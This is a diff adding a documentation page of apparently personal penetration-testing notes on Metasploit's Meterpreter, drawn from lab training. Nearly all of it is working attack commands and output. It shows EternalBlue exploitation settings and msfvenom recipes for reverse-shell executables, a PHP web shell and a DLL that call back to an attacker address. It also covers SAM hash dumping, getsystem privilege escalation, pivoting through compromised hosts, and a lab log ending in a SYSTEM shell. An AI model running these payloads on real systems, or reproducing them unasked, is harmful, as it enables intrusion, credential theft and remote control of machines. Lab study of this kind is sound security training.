@@ -1,0 +1,341 @@
+---
+title: "Meterpreter"
+sidebarTitle: "Meterpreter"
+description: "Commands and examples collected from your Meterpreter notes."
+keywords: ["Meterpreter", "meterpreter"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/meterpreter.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=meterpreter) · [All tools](/index)
+
+## Spawning TTY After Getting Shell
+
+**Notebook example**
+
+```bash
+meterpreter > shell
+# Non-interactive shell, no prompt — need TTY:
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+15 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="Core workflow — search → use → set → run">
+
+### Core workflow — search → use → set → run
+
+**Metasploit Framework: Startup to Sessions**
+
+```bash
+msf6 > search type:exploit eternalblue     # find modules (filter by type/platform/cve)
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(...) > info                    # what it does, options, targets
+msf6 exploit(...) > show options            # required/optional settings
+msf6 exploit(...) > set RHOSTS 10.10.10.40  # target
+msf6 exploit(...) > set LHOST tun0          # YOUR ip (where the shell calls back)
+msf6 exploit(...) > set LPORT 4444
+msf6 exploit(...) > show payloads           # compatible payloads
+msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(...) > check                    # (if supported) test vuln without firing
+msf6 exploit(...) > run                       # or 'exploit'
+```
+
+</Accordion>
+
+<Accordion title="Mental model">
+
+### Mental model
+
+**Metasploit Framework: Startup to Sessions**
+
+```text
+Have a vuln + MSF module?  → search → use → set RHOSTS/LHOST/PAYLOAD → run
+No module, but can run a file? → msfvenom payload → multi/handler to catch it
+Got a session?  → sessions -i, background, sessions -u (upgrade to meterpreter)
+In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
+Need the internal net? → autoroute + socks_proxy → proxychains everything else
+Always: LHOST = your tun0, payload in venom must match the handler
+```
+
+</Accordion>
+
+<Accordion title="Meterpreter — the premium payload">
+
+### Meterpreter — the premium payload
+
+**Metasploit Framework: Startup to Sessions**
+
+```bash
+meterpreter > sysinfo                 # OS, arch, hostname
+meterpreter > getuid                  # current user
+meterpreter > getprivs                # privileges held
+meterpreter > ps                      # process list
+meterpreter > migrate <PID>           # move into a more stable/privileged process
+meterpreter > hashdump                # dump SAM hashes (needs SYSTEM)
+meterpreter > upload /path file       # push a file to target
+meterpreter > download C:\\file .     # pull a file back
+meterpreter > shell                   # drop to a native OS shell
+meterpreter > getsystem               # attempt local privesc to SYSTEM
+meterpreter > background              # park the session (back to msf prompt)
+```
+
+</Accordion>
+
+<Accordion title="Payloads — staged vs stageless (the / vs _)">
+
+### Payloads — staged vs stageless (the / vs _)
+
+**Metasploit Framework: Startup to Sessions**
+
+```text
+windows/x64/meterpreter/reverse_tcp    ← staged   ( / before reverse_tcp)
+windows/x64/meterpreter_reverse_tcp    ← stageless ( _ )
+```
+
+</Accordion>
+
+<Accordion title="Post-exploitation &amp; pivoting">
+
+### Post-exploitation & pivoting
+
+**Metasploit Framework: Startup to Sessions**
+
+```bash
+meterpreter > run post/windows/gather/hashdump
+meterpreter > run post/multi/recon/local_exploit_suggester   # find privesc paths
+msf6 > use post/windows/manage/enable_rdp
+
+# Pivoting: route traffic through a compromised host to reach an internal subnet
+meterpreter > run autoroute -s 172.16.5.0/24
+msf6 > use auxiliary/server/socks_proxy        # then proxychains other tools through it
+```
+
+</Accordion>
+
+<Accordion title="Sessions &amp; the multi/handler">
+
+### Sessions & the multi/handler
+
+**Metasploit Framework: Startup to Sessions**
+
+```bash
+msf6 > sessions                 # list active sessions
+msf6 > sessions -i 1            # interact with session 1
+meterpreter > background        # or Ctrl-Z — park it
+msf6 > sessions -u 1            # upgrade a basic shell → Meterpreter
+```
+
+</Accordion>
+
+<Accordion title="msfvenom — generate standalone payloads">
+
+### msfvenom — generate standalone payloads
+
+**Metasploit Framework: Startup to Sessions**
+
+```bash
+# Linux ELF reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
+
+# Windows EXE meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
+
+# PHP web shell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shell.php
+
+# List formats / payloads
+msfvenom --list formats
+msfvenom --list payloads | grep windows
+```
+
+</Accordion>
+
+<Accordion title="2 · Metasploit routing (pivot through a session)">
+
+### 2 · Metasploit routing (pivot through a session)
+
+**Pivoting, Tunneling, and Port Forwarding: Module Notes**
+
+```bash
+# through an existing meterpreter session:
+run autoroute -s 172.16.5.0/23         # or: post/multi/manage/autoroute (autoadd)
+route print                             # verify
+# now any msf module reaching 172.16.5.x goes through the session
+# expose those routes to EXTERNAL tools:
+use auxiliary/server/socks_proxy        # SRVPORT 9050, VERSION 5, run -j
+# then proxychains (socks5 127.0.0.1 9050) your nmap/xfreerdp/etc.
+```
+
+</Accordion>
+
+<Accordion title="Common MSFvenom Commands">
+
+### Common MSFvenom Commands
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+# Linux reverse shell (stageless, ELF binary)
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf
+
+# Windows reverse shell (stageless, EXE)
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > shell.exe
+
+# Windows Meterpreter (staged)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe > meterp.exe
+
+# List all payloads
+msfvenom -l payloads
+
+# List formats
+msfvenom --list formats
+```
+
+</Accordion>
+
+<Accordion title="Metasploit Basic Workflow">
+
+### Metasploit Basic Workflow
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+# Start Metasploit
+sudo msfconsole
+
+# Search for exploits
+msf6 > search smb
+msf6 > search eternalblue
+
+# Select a module
+msf6 > use exploit/windows/smb/ms17_010_psexec
+
+# View required options
+msf6 exploit(...) > options
+
+# Set options
+msf6 exploit(...) > set RHOSTS <target_ip>
+msf6 exploit(...) > set LHOST <your_ip>
+msf6 exploit(...) > set LPORT 4444
+msf6 exploit(...) > set SMBUser <username>
+msf6 exploit(...) > set SMBPass <password>
+
+# Run the exploit
+msf6 exploit(...) > exploit
+
+# Inside Meterpreter
+meterpreter > getuid          # Check user context
+meterpreter > shell           # Drop to native OS shell
+meterpreter > upload <file>   # Upload file
+meterpreter > download <file> # Download file
+```
+
+</Accordion>
+
+<Accordion title="rConfig 3.9.6 Exploitation">
+
+### rConfig 3.9.6 Exploitation
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+msf6 > set RHOSTS <target>
+msf6 > set LHOST <your_ip>
+msf6 > exploit
+# → Meterpreter session as apache user
+```
+
+</Accordion>
+
+<Accordion title="Meterpreter getsystem and alternatives">
+
+### Meterpreter getsystem and alternatives
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+meterpreter> getsystem 
+Tokenvator.exe getsystem cmd.exe 
+incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
+psexec -s -i cmd.exe 
+python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
+```
+
+</Accordion>
+
+<Accordion title="Configuring &amp; Starting MSF multi/handler">
+
+### Configuring & Starting MSF multi/handler
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
+LHOST => 10.3.88.114
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
+LPORT => 8080
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+
+[*] Started reverse TCP handler on 172.16.5.225:8080
+```
+
+</Accordion>
+
+<Accordion title="Generating a DLL Payload">
+
+### Generating a DLL Payload
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+grcic550@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 8704 bytes
+```
+
+</Accordion>
+
+<Accordion title="Getting the SYSTEM Shell">
+
+### Getting the SYSTEM Shell
+
+**Historical AD Vulnerability Labs · older reference**
+
+```shellsession
+[*] Sending stage (200262 bytes) to 172.16.5.5
+[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400
+
+(Meterpreter 1)(C:\Windows\system32) > shell
+Process 5912 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+</Accordion>
+
+</AccordionGroup>
